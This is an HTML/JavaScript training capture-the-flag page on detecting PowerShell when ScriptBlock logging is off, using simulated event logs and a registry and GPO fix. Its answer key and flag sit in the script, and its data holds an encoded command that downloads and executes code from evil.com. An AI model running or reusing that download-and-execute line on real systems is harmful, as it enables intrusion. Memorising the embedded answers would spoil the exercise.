<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
  <title>CTF: Hunt for PowerShell Without Logging | ScriptBlock Disabled</title>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
      font-family: 'Segoe UI', 'Fira Code', system-ui, monospace;
    }
    body {
      background: linear-gradient(160deg, #001a0a 0%, #002810 50%, #001a0a 100%);
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      padding: 1.5rem;
      margin: 0;
    }
    .container {
      max-width: 1150px;
      width: 100%;
      background: rgba(5, 25, 10, 0.9);
      backdrop-filter: blur(28px);
      border: 1px solid rgba(0, 255, 100, 0.35);
      box-shadow: 0 25px 50px rgba(0, 200, 80, 0.2);
      border-radius: 2.8rem;
      padding: 2rem;
      color: #c8ffd8;
      transition: all 0.3s ease;
    }
    h1 {
      font-size: 2.3rem;
      font-weight: 700;
      text-align: center;
      background: linear-gradient(135deg, #5eff8a, #00aa40);
      -webkit-background-clip: text;
      -webkit-text-fill-color: transparent;
      margin-bottom: 0.4rem;
      letter-spacing: 1px;
    }
    .subtitle {
      text-align: center;
      color: #8ad4a0;
      margin-bottom: 1.8rem;
      border-bottom: 1px dashed #2a5a3a;
      padding-bottom: 1rem;
      font-style: italic;
    }
    .panel {
      background: rgba(5, 20, 10, 0.8);
      backdrop-filter: blur(12px);
      border-radius: 1.8rem;
      padding: 1.7rem;
      border: 1px solid #2a5a3a;
      margin-bottom: 1.8rem;
    }
    .hidden {
      display: none !important;
    }
    .flex-row {
      display: flex;
      gap: 1.2rem;
      flex-wrap: wrap;
      align-items: center;
    }
    input, button, select {
      background: #0a1a0f;
      border: 1px solid #3a6a4a;
      border-radius: 2rem;
      padding: 0.7rem 1.3rem;
      color: #d4ffe0;
      font-weight: 500;
      outline: none;
      transition: 0.2s;
      font-size: 0.9rem;
    }
    input:focus, select:focus {
      border-color: #4dff80;
      box-shadow: 0 0 14px #33cc55;
    }
    button {
      background: #1a3a20;
      border-color: #4daa60;
      cursor: pointer;
      font-weight: bold;
      display: inline-flex;
      align-items: center;
      gap: 0.3rem;
    }
    button:hover {
      background: #255030;
      border-color: #66ff8a;
      box-shadow: 0 0 18px #33cc55;
    }
    .task-card {
      background: #0a1a10;
      border-left: 6px solid #4dff80;
      padding: 1.2rem;
      border-radius: 1.3rem;
      margin: 1.2rem 0;
      animation: fadeIn 0.35s ease;
    }
    @keyframes fadeIn {
      0% { opacity: 0; transform: translateY(8px); }
      100% { opacity: 1; transform: translateY(0); }
    }
    .log-line {
      background: #051008;
      border: 1px solid #2a4a30;
      padding: 0.5rem 1rem;
      border-radius: 0.6rem;
      margin: 0.4rem 0;
      font-family: 'Fira Code', monospace;
      font-size: 0.78rem;
      white-space: pre-wrap;
      color: #b8ffcc;
    }
    .badge {
      background: #1a3a25;
      padding: 0.2rem 0.9rem;
      border-radius: 20px;
      font-size: 0.8rem;
    }
    .toggle-container {
      background: #0a1a0f;
      border: 2px solid #3a6a4a;
      border-radius: 1.5rem;
      padding: 1.5rem;
      margin: 1rem 0;
      text-align: center;
      transition: all 0.5s ease;
    }
    .toggle-container.disabled-view {
      border-color: #ff4444;
      background: #1a0505;
      box-shadow: 0 0 20px rgba(255,0,0,0.2);
    }
    .toggle-container.enabled-view {
      border-color: #4dff80;
      background: #051a08;
      box-shadow: 0 0 20px rgba(0,255,80,0.2);
    }
    .toggle-switch {
      position: relative;
      display: inline-block;
      width: 120px;
      height: 50px;
      margin: 0.5rem 0;
    }
    .toggle-switch input {
      opacity: 0;
      width: 0;
      height: 0;
    }
    .toggle-slider {
      position: absolute;
      cursor: pointer;
      top: 0;
      left: 0;
      right: 0;
      bottom: 0;
      background: #3a1a1a;
      transition: 0.4s;
      border-radius: 50px;
      border: 2px solid #ff4444;
      display: flex;
      align-items: center;
      justify-content: space-between;
      padding: 0 15px;
      font-size: 0.8rem;
      font-weight: bold;
    }
    .toggle-slider:before {
      content: "";
      position: absolute;
      height: 38px;
      width: 38px;
      left: 4px;
      bottom: 4px;
      background: #ff4444;
      transition: 0.4s;
      border-radius: 50%;
    }
    input:checked + .toggle-slider {
      background: #1a3a1a;
      border-color: #4dff80;
    }
    input:checked + .toggle-slider:before {
      transform: translateX(70px);
      background: #4dff80;
    }
    .toggle-label-off {
      color: #ff6666;
      z-index: 1;
    }
    .toggle-label-on {
      color: #66ff8a;
      z-index: 1;
    }
    .decoder-box {
      background: #051008;
      border: 2px dashed #4daa60;
      border-radius: 1rem;
      padding: 1rem;
      margin: 0.8rem 0;
      font-family: 'Fira Code', monospace;
    }
    .flag-box {
      background: #0a1a10;
      border: 2px dashed #ffd700;
      padding: 0.9rem;
      border-radius: 20px;
      text-align: center;
      font-weight: bold;
      font-size: 1.4rem;
      letter-spacing: 3px;
      color: #ffd700;
      animation: glowGold 1.7s infinite;
    }
    @keyframes glowGold {
      0% { box-shadow: 0 0 5px #ffd700; }
      50% { box-shadow: 0 0 30px #ffaa00; }
      100% { box-shadow: 0 0 5px #ffd700; }
    }
    table {
      width: 100%;
      border-collapse: collapse;
      margin-top: 0.8rem;
    }
    th {
      text-align: left;
      color: #6aff90;
      border-bottom: 1px solid #2a5a3a;
      padding: 0.4rem;
    }
    td {
      padding: 0.4rem;
      border-bottom: 1px solid #1a3a22;
    }
    .status-indicator {
      display: inline-block;
      width: 10px;
      height: 10px;
      border-radius: 50%;
      margin-right: 6px;
    }
    .toast {
      position: fixed;
      top: 20px;
      right: 20px;
      background: #1a3a1a;
      border: 1px solid #4daa60;
      padding: 1rem 1.5rem;
      border-radius: 2rem;
      color: #b8ffcc;
      font-weight: bold;
      z-index: 9999;
      animation: slideIn 0.3s ease, fadeOut 0.3s 2.5s forwards;
      box-shadow: 0 10px 25px rgba(0,0,0,0.5);
    }
    @keyframes slideIn {
      from { transform: translateX(100px); opacity: 0; }
      to { transform: translateX(0); opacity: 1; }
    }
    @keyframes fadeOut {
      to { opacity: 0; transform: translateY(-10px); }
    }
    code {
      background: #0a1a0f;
      padding: 0.2rem 0.6rem;
      border-radius: 12px;
      font-family: 'Fira Code', monospace;
    }
    .registry-key {
      background: #051008;
      border: 1px solid #4daa60;
      padding: 0.5rem 1rem;
      border-radius: 0.8rem;
      font-family: 'Fira Code', monospace;
      font-size: 0.8rem;
      color: #66ff8a;
      margin: 0.4rem 0;
    }
  </style>
</head>
<body>
<div class="container" id="appContainer">
  <!-- LOGIN SECTION -->
  <div id="loginSection">
    <h1>⚡ PS NO-LOG HUNTER</h1>
    <div class="subtitle">PowerShell Without ScriptBlock Logging · Alternative Detection</div>
    <div class="panel">
      <div class="flex-row" style="justify-content: center;">
        <button id="studentLoginBtn">🎓 Student Access</button>
        <button id="adminLoginBtn">🛡️ Admin Panel</button>
      </div>
      <div id="studentLoginForm" class="hidden" style="margin-top:1.6rem; text-align:center;">
        <input type="text" id="studentNameInput" placeholder="Your full name" autocomplete="off" style="width:70%;">
        <input type="password" id="studentPassInput" placeholder="Student batch password" style="width:70%; margin-top:0.7rem;">
        <button id="studentSubmitLogin" style="margin-top:0.8rem;">🔐 Enter CTF</button>
        <p style="font-size:0.8rem; color:#8ad4a0; margin-top:0.5rem;">Default password: <code>pslog2025</code></p>
      </div>
      <div id="adminLoginForm" class="hidden" style="margin-top:1.6rem; text-align:center;">
        <input type="password" id="adminPassInput" placeholder="Admin password">
        <button id="adminSubmitLogin" style="margin-top:0.8rem;">🔑 Admin Login</button>
        <p style="font-size:0.8rem; color:#8ad4a0; margin-top:0.5rem;">Default admin: <code>admin123</code></p>
      </div>
    </div>
  </div>

  <!-- STUDENT DASHBOARD -->
  <div id="studentDashboard" class="hidden">
    <div style="display:flex; justify-content:space-between; align-items:center;">
      <h2 style="color:#5eff8a;">👤 <span id="displayStudentName"></span></h2>
      <button id="logoutStudentBtn">🚪 Logout</button>
    </div>
    <div id="taskContainer"></div>
  </div>

  <!-- ADMIN PANEL -->
  <div id="adminDashboard" class="hidden">
    <div style="display:flex; justify-content:space-between;">
      <h2 style="color:#6aff90;">🛡️ ADMINISTRATOR</h2>
      <button id="logoutAdminBtn">Exit</button>
    </div>
    <div class="panel">
      <h3>🔐 Student Batch Password</h3>
      <p style="font-size:0.8rem; color:#8ad4a0; margin-bottom:0.5rem;">Current: <code id="currentStudentPassDisplay"></code></p>
      <div class="flex-row">
        <input type="text" id="newStudentPassword" placeholder="New student password">
        <button id="updateStudentPasswordBtn">Update</button>
      </div>
      <hr style="border-color:#2a5a3a; margin:1.2rem 0;">
      <h3>🔑 Change Admin Password</h3>
      <p style="font-size:0.8rem; color:#8ad4a0; margin-bottom:0.5rem;">Current: <code id="currentAdminPassDisplay"></code></p>
      <div class="flex-row">
        <input type="password" id="newAdminPassword" placeholder="New admin password">
        <button id="updateAdminPasswordBtn">Update</button>
      </div>
      <hr style="border-color:#2a5a3a; margin:1.2rem 0;">
      <h3>📋 Student Progress</h3>
      <div id="adminStudentList"></div>
      <button id="resetAllProgressBtn" style="background:#3a1a1a; border-color:#aa3030; margin-top:1rem;">⚠️ Reset All Student Progress</button>
    </div>
  </div>
</div>

<script>
  (function() {
    // ============ STORAGE KEYS ============
    const ADMIN_PASS_KEY = 'pslog_admin_pass_v2';
    const STUDENT_PASS_KEY = 'pslog_student_pass_v2';
    const STUDENTS_DB_KEY = 'pslog_students_db_v2';
    const INITIALIZED_KEY = 'pslog_initialized_v2';

    // ============ DEFAULT VALUES ============
    const DEFAULT_ADMIN_PASS = 'admin123';
    const DEFAULT_STUDENT_PASS = 'pslog2025';

    // ============ INITIALIZATION ============
    function initializeStorage() {
      if (!localStorage.getItem(INITIALIZED_KEY)) {
        if (!localStorage.getItem(ADMIN_PASS_KEY)) {
          localStorage.setItem(ADMIN_PASS_KEY, DEFAULT_ADMIN_PASS);
        }
        if (!localStorage.getItem(STUDENT_PASS_KEY)) {
          localStorage.setItem(STUDENT_PASS_KEY, DEFAULT_STUDENT_PASS);
        }
        if (!localStorage.getItem(STUDENTS_DB_KEY)) {
          localStorage.setItem(STUDENTS_DB_KEY, JSON.stringify([]));
        }
        localStorage.setItem(INITIALIZED_KEY, 'true');
      }
    }
    initializeStorage();

    // ============ STATE ============
    let currentUser = null;
    let adminActive = false;
    let loggingEnabled = false;

    // ============ TASKS ============
    const tasks = [
      { id: 1, title: "🔍 Task 1: Identify Registry Key", desc: "Which registry value controls ScriptBlock logging? (format: ValueName = X)", answer: "EnableScriptBlockLogging = 0" },
      { id: 2, title: "📋 Task 2: Alternative Event IDs", desc: "Select the TWO event IDs to hunt PowerShell without ScriptBlock logs (comma separated, e.g., '4688, 400')", answer: "4688, 400", extra: "eventIds" },
      { id: 3, title: "⚠️ Task 3: Suspicious PowerShell Command", desc: "From Event 4688 logs below, find the suspicious encoded command line (copy exact command starting with 'powershell')", answer: "powershell -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvAGUAdgBpAGwALgBjAG8AbQAvAHAAYQB5AGwAbwBhAGQALgBlAHgAZQAnACkA", extra: "processLogs" },
      { id: 4, title: "🔓 Task 4: Decode the Command", desc: "The encoded command decodes to what action? (three words describing the malicious activity)", answer: "download malicious payload", extra: "decoder" },
      { id: 5, title: "🛡️ Task 5: GPO Remediation", desc: "What GPO setting should be enabled? (exact path format: Computer\\Policies\\...\\Setting = Value)", answer: "Computer\\Administrative Templates\\Windows Components\\Windows PowerShell\\Turn on Script Block Logging = Enabled", extra: "gpo" }
    ];

    // ============ SIMULATED DATA ============
    const processLogs = [
      "Event 4688: cmd.exe (PID: 4520) → whoami.exe",
      "Event 4688: powershell.exe (PID: 5580) → powershell -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvAGUAdgBpAGwALgBjAG8AbQAvAHAAYQB5AGwAbwBhAGQALgBlAHgAZQAnACkA",
      "Event 4688: powershell.exe (PID: 5590) → Get-Service",
      "Event 4688: wscript.exe (PID: 5600) → script.vbs",
      "Event 400: PowerShell Engine started (PID: 5580)",
      "Event 400: PowerShell Engine started (PID: 5590)"
    ];

    const encodedCommand = "SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvAGUAdgBpAGwALgBjAG8AbQAvAHAAYQB5AGwAbwBhAGQALgBlAHgAZQAnACkA";
    const decodedCommand = "IEX(New-Object Net.WebClient).DownloadString('http://evil.com/payload.exe')";

    const eventIdOptions = [
      { id: "4688", label: "4688 - Process Creation" },
      { id: "400", label: "400 - PowerShell Engine Start" },
      { id: "4104", label: "4104 - ScriptBlock Logging" },
      { id: "4624", label: "4624 - Logon Event" },
      { id: "5156", label: "5156 - Network Connection" }
    ];

    // ============ HELPERS ============
    function getStudents() {
      try { return JSON.parse(localStorage.getItem(STUDENTS_DB_KEY) || '[]'); }
      catch(e) { return []; }
    }
    
    function saveStudents(arr) { 
      localStorage.setItem(STUDENTS_DB_KEY, JSON.stringify(arr)); 
    }
    
    function getStudentPassword() { 
      return localStorage.getItem(STUDENT_PASS_KEY) || DEFAULT_STUDENT_PASS; 
    }
    
    function getAdminPassword() { 
      return localStorage.getItem(ADMIN_PASS_KEY) || DEFAULT_ADMIN_PASS; 
    }

    function showToast(message, isError = false) {
      const existingToast = document.querySelector('.toast');
      if (existingToast) existingToast.remove();
      
      const toast = document.createElement('div');
      toast.className = 'toast';
      toast.style.background = isError ? '#3a1a1a' : '#1a3a1a';
      toast.style.borderColor = isError ? '#aa3030' : '#4daa60';
      toast.style.color = isError ? '#ffaaaa' : '#b8ffcc';
      toast.textContent = message;
      document.body.appendChild(toast);
      
      setTimeout(() => {
        if (toast.parentNode) toast.remove();
      }, 3000);
    }

    function updateCompletion(name, taskId) {
      let students = getStudents();
      let s = students.find(s => s.name.toLowerCase() === name.toLowerCase());
      if (s && !s.completedTasks.includes(taskId)) {
        s.completedTasks.push(taskId);
        saveStudents(students);
        if (currentUser && currentUser.name.toLowerCase() === name.toLowerCase()) {
          currentUser.completedTasks = [...s.completedTasks];
        }
        return true;
      }
      return false;
    }

    // ============ RENDER ============
    function renderTasks() {
      if (!currentUser) return;
      document.getElementById('displayStudentName').innerText = currentUser.name;
      const container = document.getElementById('taskContainer');
      const completed = currentUser.completedTasks || [];
      
      let html = '<h3 style="margin-bottom:1rem;">⚡ PowerShell Logging Toggle View</h3>';
      
      // Toggle switch
      html += `<div class="toggle-container ${loggingEnabled ? 'enabled-view' : 'disabled-view'}" id="toggleContainer">`;
      html += '<p style="font-size:0.9rem; margin-bottom:0.5rem;">🔧 ScriptBlock Logging Status:</p>';
      html += `<label class="toggle-switch">
        <input type="checkbox" id="loggingToggle" ${loggingEnabled ? 'checked' : ''} onchange="toggleLogging(this.checked)">
        <span class="toggle-slider">
          <span class="toggle-label-off">OFF</span>
          <span class="toggle-label-on">ON</span>
        </span>
      </label>`;
      html += `<p style="margin-top:0.5rem; font-size:0.85rem; color:${loggingEnabled ? '#66ff8a' : '#ff6666'};">
        ${loggingEnabled ? '✅ ScriptBlock logging is ENABLED - Full visibility' : '❌ ScriptBlock logging is DISABLED - Blind spot!'}
      </p>`;
      if (!loggingEnabled) {
        html += '<p style="font-size:0.75rem; color:#ff8888;">⚠️ Attacker advantage: PowerShell commands not logged in Event 4104</p>';
      }
      html += '</div>';

      // Registry key display
      html += '<div class="registry-key">';
      html += '📁 HKLM\\SOFTWARE\\Microsoft\\PowerShell\\1\\ShellIds\\Microsoft.PowerShell<br>';
      html += `   EnableScriptBlockLogging = <span style="color:${loggingEnabled ? '#66ff8a' : '#ff6666'};">${loggingEnabled ? '1' : '0'}</span>`;
      html += '</div>';

      tasks.forEach(task => {
        const done = completed.includes(task.id);
        html += `<div class="task-card" style="border-left-color: ${done ? '#2ecc71' : '#4dff80'}; animation-delay: ${task.id * 0.1}s;">`;
        html += `<strong>${task.title}</strong> <span class="badge">${done ? '✅ Complete' : '🔒 Pending'}</span>`;
        html += `<p style="margin:0.4rem 0;">${task.desc}</p>`;

        if (task.extra === 'eventIds') {
          html += '<p style="font-size:0.8rem; color:#8ad4a0;">Select exactly TWO event IDs:</p>';
          html += '<div style="display:flex; flex-wrap:wrap; gap:0.5rem; margin:0.5rem 0;">';
          eventIdOptions.forEach(opt => {
            html += `<label style="cursor:pointer; padding:0.4rem 0.8rem; border-radius:1.5rem; background:#0a1a0f; border:1px solid #3a6a4a; display:flex; align-items:center; gap:0.3rem;">
              <input type="checkbox" class="eventCheckbox" value="${opt.id}" ${done ? 'disabled' : ''}> ${opt.label}
            </label>`;
          });
          html += '</div>';
          if (!done) {
            html += `<button onclick="submitEventIds()" style="margin-top:0.5rem;">✅ Submit Event IDs</button>`;
          }
        } else if (task.extra === 'processLogs') {
          html += '<div class="log-line">📋 Event 4688 - Process Creation Logs:</div>';
          processLogs.forEach(l => {
            const isSuspicious = l.includes('-enc');
            html += `<div class="log-line" style="${isSuspicious ? 'border-left:3px solid #ff4444; background:#0a0505;' : ''}">
              ${l} ${isSuspicious ? '⚠️ ENCODED COMMAND' : ''}
            </div>`;
          });
          if (!loggingEnabled) {
            html += '<div class="log-line" style="border-left:3px solid #ff8800; color:#ffaa66;">⚠️ Note: Event 4104 (ScriptBlock) would be empty/missing</div>';
          }
        } else if (task.extra === 'decoder') {
          html += '<div class="decoder-box">';
          html += '<p style="color:#66ff8a;">🔓 Encoded Command:</p>';
          html += `<p style="font-size:0.7rem; word-break:break-all; color:#8ad4a0;">${encodedCommand}</p>`;
          html += '<p style="color:#66ff8a; margin-top:0.5rem;">📝 Simulated Decode:</p>';
          html += `<p style="color:#ffd700; font-weight:bold;">${decodedCommand}</p>`;
          html += '<p style="font-size:0.7rem; color:#8ad4a0;">💡 Hint: This downloads and executes remote code</p>';
          html += '</div>';
        } else if (task.extra === 'gpo') {
          html += '<div class="log-line">📋 GPO Path Reference:</div>';
          html += '<div class="log-line">Computer Configuration\\Administrative Templates\\Windows Components\\Windows PowerShell</div>';
          html += '<div class="log-line">Setting: <span style="color:#66ff8a;">Turn on Script Block Logging</span></div>';
        }

        if (!done && task.extra !== 'eventIds') {
          html += `<div style="display:flex; gap:0.5rem; align-items:center; margin-top:0.5rem;">`;
          html += `<input type="text" id="answerInput${task.id}" placeholder="Your answer" style="flex:1;">`;
          html += `<button onclick="submitTask(${task.id})">✅ Submit</button>`;
          html += `</div>`;
        } else if (done) {
          html += `<p style="color:#9effb7; font-weight:bold;">✔ Task Completed Successfully</p>`;
        }
        html += '</div>';
      });

      if (completed.length === tasks.length) {
        html += '<div class="flag-box" style="animation: glowGold 1.7s infinite, fadeIn 0.5s ease;">';
        html += '🏆 FLAG{POWERSHELL_NO_LOGGING} 🏆';
        html += '</div>';
        html += '<p style="text-align:center; color:#ffd700; margin-top:0.5rem;">🎉 Excellent hunting! PowerShell detected despite disabled logging.</p>';
      }
      
      container.innerHTML = html;
    }

    window.toggleLogging = function(enabled) {
      loggingEnabled = enabled;
      renderTasks();
      const msg = enabled ? '✅ ScriptBlock logging ENABLED - Event 4104 now visible' : '❌ ScriptBlock logging DISABLED - Blind spot activated';
      showToast(msg);
    };

    window.submitEventIds = function() {
      if (!currentUser) return;
      const checkboxes = document.querySelectorAll('.eventCheckbox:checked');
      const selected = Array.from(checkboxes).map(cb => cb.value).sort().join(', ');
      
      const selectedSet = new Set(selected.split(', ').filter(s => s));
      const correctSet = new Set(["4688", "400"]);
      
      if (selectedSet.size === 2 && [...selectedSet].every(id => correctSet.has(id))) {
        const wasNew = updateCompletion(currentUser.name, 2);
        if (wasNew) {
          showToast('✅ Correct! Event IDs 4688 and 400 for hunting without ScriptBlock logs.');
        }
        renderTasks();
      } else {
        showToast('❌ Incorrect. You need exactly 4688 (Process Create) and 400 (Engine Start).', true);
      }
    };

    window.submitTask = function(taskId) {
      if (!currentUser) return;
      const input = document.getElementById(`answerInput${taskId}`);
      if (!input) return;
      const ans = input.value.trim();
      const task = tasks.find(t => t.id === taskId);
      if (!task) return;
      
      let isCorrect = false;
      
      if (taskId === 4) {
        const lowerAns = ans.toLowerCase();
        isCorrect = lowerAns.includes('download') && 
                   (lowerAns.includes('malicious') || lowerAns.includes('payload')) &&
                   (lowerAns.includes('execute') || lowerAns.includes('run') || lowerAns.includes('payload'));
        if (ans.toLowerCase() === task.answer.toLowerCase()) isCorrect = true;
      } else {
        isCorrect = ans.toLowerCase() === task.answer.toLowerCase();
      }
      
      if (isCorrect) {
        const wasNew = updateCompletion(currentUser.name, taskId);
        if (wasNew) {
          showToast('✅ Correct! Task completed successfully.');
        } else {
          showToast('ℹ️ Task was already completed.');
        }
        renderTasks();
      } else {
        showToast('❌ Incorrect answer. Review the evidence carefully.', true);
        input.style.animation = 'shake 0.5s ease';
        setTimeout(() => { input.style.animation = ''; }, 500);
      }
    };

    function renderAdminList() {
      const students = getStudents();
      const cont = document.getElementById('adminStudentList');
      if (!cont) return;
      
      document.getElementById('currentStudentPassDisplay').textContent = getStudentPassword();
      document.getElementById('currentAdminPassDisplay').textContent = getAdminPassword();
      
      if (students.length === 0) {
        cont.innerHTML = '<p style="color:#8ad4a0;">📭 No students have logged in yet.</p>';
        return;
      }
      
      let html = '<table><tr><th>Student Name</th><th>Tasks Completed</th><th>Progress</th><th>Status</th></tr>';
      students.forEach(s => {
        const cnt = (s.completedTasks || []).length;
        const percentage = Math.round((cnt / tasks.length) * 100);
        const statusColor = cnt === tasks.length ? '#2ecc71' : cnt > 0 ? '#f39c12' : '#e74c3c';
        html += `<tr>
          <td>${escapeHtml(s.name)}</td>
          <td>${cnt} / ${tasks.length}</td>
          <td>
            <div style="background:#0a1a0f; border-radius:10px; height:8px; width:100px; overflow:hidden;">
              <div style="width:${percentage}%; height:100%; background:${statusColor}; transition: width 0.3s;"></div>
            </div>
          </td>
          <td><span class="status-indicator" style="background:${statusColor};"></span>${cnt === tasks.length ? 'Flag Obtained' : cnt > 0 ? 'In Progress' : 'Not Started'}</td>
        </tr>`;
      });
      html += '</table>';
      cont.innerHTML = html;
    }

    function escapeHtml(t) { 
      return String(t).replace(/[&<>"]/g, m => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;'})[m]); 
    }

    // ============ VIEW SWITCHING ============
    function showLogin() {
      document.getElementById('loginSection').classList.remove('hidden');
      document.getElementById('studentDashboard').classList.add('hidden');
      document.getElementById('adminDashboard').classList.add('hidden');
      document.getElementById('studentLoginForm').classList.add('hidden');
      document.getElementById('adminLoginForm').classList.add('hidden');
      currentUser = null; 
      adminActive = false;
    }

    function showStudentDash() {
      document.getElementById('loginSection').classList.add('hidden');
      document.getElementById('studentDashboard').classList.remove('hidden');
      document.getElementById('adminDashboard').classList.add('hidden');
      loggingEnabled = false;
      renderTasks();
    }

    function showAdminDash() {
      document.getElementById('loginSection').classList.add('hidden');
      document.getElementById('studentDashboard').classList.add('hidden');
      document.getElementById('adminDashboard').classList.remove('hidden');
      renderAdminList();
    }

    // ============ EVENT LISTENERS ============
    document.addEventListener('DOMContentLoaded', ()=>{
      document.getElementById('studentLoginBtn').addEventListener('click', ()=>{
        document.getElementById('studentLoginForm').classList.remove('hidden');
        document.getElementById('adminLoginForm').classList.add('hidden');
      });
      
      document.getElementById('adminLoginBtn').addEventListener('click', ()=>{
        document.getElementById('adminLoginForm').classList.remove('hidden');
        document.getElementById('studentLoginForm').classList.add('hidden');
      });

      document.getElementById('studentSubmitLogin').addEventListener('click', ()=>{
        const name = document.getElementById('studentNameInput').value.trim();
        const pass = document.getElementById('studentPassInput').value.trim();
        
        if(!name || !pass) {
          showToast('Please enter both name and password.', true);
          return;
        }
        
        if(pass !== getStudentPassword()) {
          showToast('Invalid student batch password.', true);
          return;
        }
        
        let students = getStudents();
        let stu = students.find(s => s.name.toLowerCase() === name.toLowerCase());
        if(!stu) { 
          stu = {name, completedTasks: []}; 
          students.push(stu); 
          saveStudents(students);
          showToast(`Welcome, ${name}! New profile created.`);
        } else {
          showToast(`Welcome back, ${name}!`);
        }
        
        currentUser = {name: stu.name, completedTasks: [...stu.completedTasks]};
        document.getElementById('studentNameInput').value = '';
        document.getElementById('studentPassInput').value = '';
        showStudentDash();
      });

      document.getElementById('adminSubmitLogin').addEventListener('click', ()=>{
        const pass = document.getElementById('adminPassInput').value.trim();
        if(pass === getAdminPassword()){
          adminActive = true; 
          document.getElementById('adminPassInput').value = ''; 
          showToast('Admin access granted.');
          showAdminDash();
        } else {
          showToast('Invalid admin password.', true);
        }
      });

      document.getElementById('logoutStudentBtn').addEventListener('click', ()=>{
        showToast('Logged out successfully.');
        showLogin();
      });
      
      document.getElementById('logoutAdminBtn').addEventListener('click', ()=>{
        showToast('Admin logged out.');
        showLogin();
      });

      document.getElementById('updateStudentPasswordBtn').addEventListener('click', ()=>{
        if (!adminActive) return;
        const np = document.getElementById('newStudentPassword').value.trim();
        if(!np) {
          showToast('Please enter a new password.', true);
          return;
        }
        localStorage.setItem(STUDENT_PASS_KEY, np);
        showToast('✅ Student password updated successfully!');
        document.getElementById('newStudentPassword').value = '';
        renderAdminList();
      });

      document.getElementById('updateAdminPasswordBtn').addEventListener('click', ()=>{
        if (!adminActive) return;
        const np = document.getElementById('newAdminPassword').value.trim();
        if(!np) {
          showToast('Please enter a new admin password.', true);
          return;
        }
        localStorage.setItem(ADMIN_PASS_KEY, np);
        showToast('✅ Admin password changed successfully!');
        document.getElementById('newAdminPassword').value = '';
        renderAdminList();
      });

      document.getElementById('resetAllProgressBtn').addEventListener('click', ()=>{
        if (!adminActive) return;
        if (confirm('⚠️ Are you sure you want to reset ALL student progress? This cannot be undone.')) {
          saveStudents([]);
          showToast('All student progress has been reset.');
          renderAdminList();
        }
      });

      // Add shake animation
      const style = document.createElement('style');
      style.textContent = `
        @keyframes shake {
          0%, 100% { transform: translateX(0); }
          25% { transform: translateX(-10px); }
          75% { transform: translateX(10px); }
        }
      `;
      document.head.appendChild(style);

      showLogin();
    });
  })();
</script>
</body>
</html>
